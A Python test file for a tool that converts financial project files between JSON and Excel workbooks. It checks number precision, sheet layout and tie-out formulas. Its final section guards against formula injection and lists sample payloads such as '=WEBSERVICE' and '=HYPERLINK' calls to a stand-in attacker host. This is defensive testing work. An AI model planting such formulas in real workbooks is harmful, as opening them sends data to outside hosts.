"""The spreadsheet path: one schema, a preserved layout, and a lossless round trip.

Three things have to hold. An analyst's workbook goes through the **same**
validator as a JSON file, so there is one schema rather than two. The layout is
§13's exactly, because every ``TieOuts`` formula is a hard-coded
``Statements!<col><row>`` reference and a shifted row silently re-points twelve
rows of thirty formulas. And a JSON -> xlsx -> JSON round trip loses nothing,
which needs more care than it sounds: openpyxl writes ``%.16g`` and a double
needs seventeen significant digits.
"""

from __future__ import annotations

import datetime as dt
import json
import zipfile
from pathlib import Path
from typing import Any, Final

import pytest
from openpyxl import Workbook, load_workbook

from terrafolio.config.assumptions import AssumptionSet
from terrafolio.config.loader import load_default
from terrafolio.domain.conventions import YEARS
from terrafolio.domain.project_file import ProjectFile
from terrafolio.generate.pipeline import as_file, generate_pipeline
from terrafolio.generate.spreadsheet import (
    ASSUMPTION_FIELDS,
    IDENTITY_FIELDS,
    read_workbook,
    statement_rows,
    write_workbook,
)

REPO: Final = Path(__file__).resolve().parents[2]
TEMPLATE_JSON: Final = REPO / "templates" / "project-template.json"
TEMPLATE_XLSX: Final = REPO / "templates" / "project-template.xlsx"

SHEETS: Final = ("Identity", "Assumptions", "Provenance", "Statements", "TieOuts")


def leaves(node: Any, path: str = "") -> Any:
    if isinstance(node, dict):
        for key, value in node.items():
            yield from leaves(value, f"{path}.{key}")
    elif isinstance(node, list):
        for index, value in enumerate(node):
            yield from leaves(value, f"{path}[{index}]")
    else:
        yield path, node


@pytest.fixture(scope="module")
def assumptions() -> AssumptionSet:
    return load_default()


@pytest.fixture(scope="module")
def template() -> dict[str, Any]:
    return json.loads(TEMPLATE_JSON.read_text(encoding="utf-8"))


# --------------------------------------------------------------------------
# The round trip
# --------------------------------------------------------------------------


def test_the_template_round_trips_unchanged(template: dict[str, Any], tmp_path: Path) -> None:
    assert read_workbook(write_workbook(template, tmp_path / "t.xlsx")) == template


def test_generated_files_round_trip_unchanged(assumptions: AssumptionSet, tmp_path: Path) -> None:
    """The hard case: generated values carry full double precision.

    openpyxl formats numbers with ``%.16g``, which is one digit short of what a
    binary64 needs. Measured before the writer was corrected, 8,578 of 32,400
    values came back changed in their last digit.
    """
    compared = 0
    for built in generate_pipeline(12, 1, assumptions):
        source = as_file(built, assumptions)
        returned = read_workbook(write_workbook(source, tmp_path / f"{built.site.id}.xlsx"))
        left, right = dict(leaves(source)), dict(leaves(returned))
        assert set(left) == set(right), built.site.id
        for key, value in left.items():
            compared += 1
            assert value == right[key], f"{built.site.id}{key}"
    assert compared > 9000


def test_a_round_tripped_file_still_validates(assumptions: AssumptionSet, tmp_path: Path) -> None:
    """The point of the path: one schema, not two."""
    for built in generate_pipeline(4, 7, assumptions):
        source = as_file(built, assumptions)
        ProjectFile.model_validate(read_workbook(write_workbook(source, tmp_path / "x.xlsx")))


def test_a_seventeen_digit_double_survives(template: dict[str, Any], tmp_path: Path) -> None:
    """Pinned directly, because it is the one thing openpyxl gets wrong."""
    awkward = 0.26933739898118453
    assert len(repr(awkward)) > len(f"{awkward:.16g}")
    edited = json.loads(json.dumps(template))
    edited["asset"]["netCapacityFactor"] = awkward
    returned = read_workbook(write_workbook(edited, tmp_path / "p.xlsx"))
    assert returned["asset"]["netCapacityFactor"] == awkward


def test_an_empty_dscr_cell_means_null(template: dict[str, Any], tmp_path: Path) -> None:
    """§13: the only blank cell in the workbook, and the only null in a file."""
    returned = read_workbook(write_workbook(template, tmp_path / "d.xlsx"))
    dscr = returned["statements"]["ratios"]["dscr"]
    assert len(dscr) == YEARS
    assert dscr[0] is None
    assert any(value is not None for value in dscr)
    assert dscr == template["statements"]["ratios"]["dscr"]


def test_an_integer_field_is_narrowed_back_from_a_float(
    template: dict[str, Any], tmp_path: Path
) -> None:
    """A spreadsheet has one numeric type; the schema does not.

    ``debtTenorYears`` of ``18.0`` is the format's doing, not the analyst's, so
    it is narrowed. A genuine ``18.5`` is not, and fails validation as it should.
    """
    edited = json.loads(json.dumps(template))
    edited["assumptions"]["debtTenorYears"] = 18.0
    returned = read_workbook(write_workbook(edited, tmp_path / "n.xlsx"))
    assert returned["assumptions"]["debtTenorYears"] == 18
    assert isinstance(returned["assumptions"]["debtTenorYears"], int)
    ProjectFile.model_validate(returned)


def test_a_date_comes_back_as_an_iso_string(template: dict[str, Any], tmp_path: Path) -> None:
    edited = json.loads(json.dumps(template))
    edited["provenance"]["preparedOn"] = dt.date(2026, 8, 14).isoformat()
    returned = read_workbook(write_workbook(edited, tmp_path / "p.xlsx"))
    assert returned["provenance"]["preparedOn"] == "2026-08-14"


# --------------------------------------------------------------------------
# The layout (§13), which is 1B's and is preserved
# --------------------------------------------------------------------------


def test_the_committed_template_has_the_expected_sheets() -> None:
    assert tuple(load_workbook(TEMPLATE_XLSX).sheetnames) == SHEETS


def test_the_committed_template_is_the_committed_json() -> None:
    """The workbook and the JSON are one project, not two that drifted."""
    assert read_workbook(TEMPLATE_XLSX) == json.loads(TEMPLATE_JSON.read_text(encoding="utf-8"))


def test_the_statement_geometry_is_the_one_the_formulas_assume() -> None:
    """Every TieOuts formula is a hard-coded row reference. These are those rows.

    Pinned as literals rather than derived, because deriving them from the same
    description the formulas use would make this test agree with any shift.
    """
    rows = statement_rows()
    assert rows["physicals.generationGwh"] == 3
    assert rows["physicals.achievedPrice"] == 4
    assert rows["incomeStatement.revenue"] == 6
    assert rows["incomeStatement.ebitda"] == 8
    assert rows["incomeStatement.depreciation"] == 9
    assert rows["incomeStatement.interestExpense"] == 11
    assert rows["incomeStatement.pbt"] == 12
    assert rows["cashFlow.interestPaid"] == 16
    assert rows["cashFlow.capex"] == 19
    assert rows["cashFlow.fcfe"] == 22
    assert rows["debtSchedule.opening"] == 24
    assert rows["debtSchedule.closing"] == 27
    assert rows["balanceSheet.ppe"] == 29
    assert rows["ratios.dscr"] == 31


def test_the_absolute_references_the_tieouts_depend_on_have_not_moved() -> None:
    """``Identity!$B$13``, ``$B$25``, ``$B$26`` and ``Assumptions!$B$6``.

    The five settled ``assumptions`` fields were appended **after**
    ``debtTenorYears`` precisely so that ``Assumptions!$B$6`` still names it.
    """
    assert IDENTITY_FIELDS.index(("asset.codYear", "year")) + 2 == 13
    assert IDENTITY_FIELDS.index(("capitalStructure.totalCapex", "EURm")) + 2 == 25
    assert IDENTITY_FIELDS.index(("capitalStructure.seniorDebt", "EURm")) + 2 == 26
    assert ASSUMPTION_FIELDS.index(("assumptions.debtTenorYears", "years")) + 2 == 6


def test_the_tieouts_sheet_checks_every_tie_out_and_reports_pass_or_fail() -> None:
    sheet = load_workbook(TEMPLATE_XLSX)["TieOuts"]
    labels = [sheet.cell(row, 1).value for row in range(2, 20)]
    for expected in (
        "ebitda = revenue - opex",
        "revenue = generationGwh * 1000 * achievedPrice / 1e6",
        "closing = opening - repayment + drawdown",
        "dscr is present exactly inside the debt life",
        "sum depreciation = totalCapex - ppe[last]",
    ):
        assert expected in labels, expected
    for row in range(2, 20):
        assert str(sheet.cell(row, 3).value).startswith("=IF(B"), row


def test_the_dscr_coverage_check_is_derived_not_guessed() -> None:
    """§13: a blank inside the debt life is a FAIL, not an assumption of correctness."""
    sheet = load_workbook(TEMPLATE_XLSX)["TieOuts"]
    row = [sheet.cell(r, 1).value for r in range(1, 20)].index(
        "dscr is present exactly inside the debt life"
    ) + 1
    formula = str(sheet.cell(row, 4).value)
    assert "Identity!$B$13" in formula
    assert "Assumptions!$B$6" in formula


def test_a_workbook_missing_a_sheet_is_refused(tmp_path: Path) -> None:
    book = Workbook()
    book.save(tmp_path / "empty.xlsx")
    with pytest.raises(ValueError, match="missing sheet"):
        read_workbook(tmp_path / "empty.xlsx")


def test_a_workbook_missing_a_field_row_is_refused(
    template: dict[str, Any], tmp_path: Path
) -> None:
    """A deleted row is a real accident, and it should name the field."""
    path = write_workbook(template, tmp_path / "gap.xlsx")
    book = load_workbook(path)
    book["Identity"].delete_rows(14)
    book.save(path)
    with pytest.raises(ValueError, match=r"asset\.netCapacityFactor"):
        read_workbook(path)


# --------------------------------------------------------------------------
# A workbook must not turn a project's own text into a formula
# --------------------------------------------------------------------------

FORMULA_FIELDS: Final = (
    '=HYPERLINK("http://attacker.example/"&A1,"Open me")',
    "=1+1",
    '=WEBSERVICE("http://attacker.example")',
    "@SUM(A1:A9)",
    "+1+1",
)
"""Strings a schema-valid project may legitimately carry in a free-text field.

`name` is 1-120 characters of free text, and `preparedBy`, `modelVersion` and
every provenance `note` are likewise. Nothing in the schema forbids a leading
`=`, and nothing should: it is a plausible thing to type.
"""


def poisoned(template: dict[str, Any], value: str) -> dict[str, Any]:
    edited = json.loads(json.dumps(template))
    edited["name"] = value
    edited["provenance"]["preparedBy"] = value
    edited["provenance"]["modelVersion"] = value
    edited["provenance"]["fields"]["grid"]["note"] = value
    return edited


@pytest.mark.parametrize("value", FORMULA_FIELDS)
def test_project_text_is_never_written_as_a_formula(
    template: dict[str, Any], tmp_path: Path, value: str
) -> None:
    """openpyxl infers a formula from a leading `=`; exported text must stay text.

    Left inferred, exporting an ingested project writes a live formula that Excel
    evaluates when an analyst opens the workbook -- `HYPERLINK` and the
    `WEBSERVICE` family reach the network -- and the cell stops round-tripping as
    the text it was.
    """
    edited = poisoned(template, value)
    ProjectFile.model_validate(edited)
    path = write_workbook(edited, tmp_path / "poisoned.xlsx")

    book = load_workbook(path)
    for sheet in ("Identity", "Assumptions", "Provenance", "Statements"):
        for row in book[sheet].iter_rows():
            for cell in row:
                assert cell.data_type != "f", f"{sheet}!{cell.coordinate} is a formula"


@pytest.mark.parametrize("value", FORMULA_FIELDS)
def test_formula_like_text_still_round_trips(
    template: dict[str, Any], tmp_path: Path, value: str
) -> None:
    edited = poisoned(template, value)
    returned = read_workbook(write_workbook(edited, tmp_path / "poisoned.xlsx"))
    assert returned == edited


def test_no_formula_reaches_the_stored_xml_outside_tieouts(
    template: dict[str, Any], tmp_path: Path
) -> None:
    """Checked in the file itself, not only through openpyxl's own reader.

    `TieOuts` is the one sheet that is meant to carry formulas -- it builds its
    own, from the layout, and none of them contain project text.
    """
    path = write_workbook(poisoned(template, "=1+1"), tmp_path / "poisoned.xlsx")
    archive = zipfile.ZipFile(path)
    names = {
        sheet: archive.read(f"xl/worksheets/sheet{index}.xml").decode("utf-8")
        for index, sheet in enumerate(SHEETS, start=1)
    }
    for sheet, xml in names.items():
        assert ("<f>" in xml) is (sheet == "TieOuts"), sheet


def test_the_tieouts_sheet_keeps_its_formulas(template: dict[str, Any], tmp_path: Path) -> None:
    """The fix must not disarm the workbook's own proof of itself."""
    book = load_workbook(write_workbook(template, tmp_path / "t.xlsx"))
    sheet = book["TieOuts"]
    assert sheet.cell(2, 4).data_type == "f"
    assert sheet.cell(15, 2).data_type == "f"
    assert str(sheet.cell(2, 3).value).startswith("=IF(B")
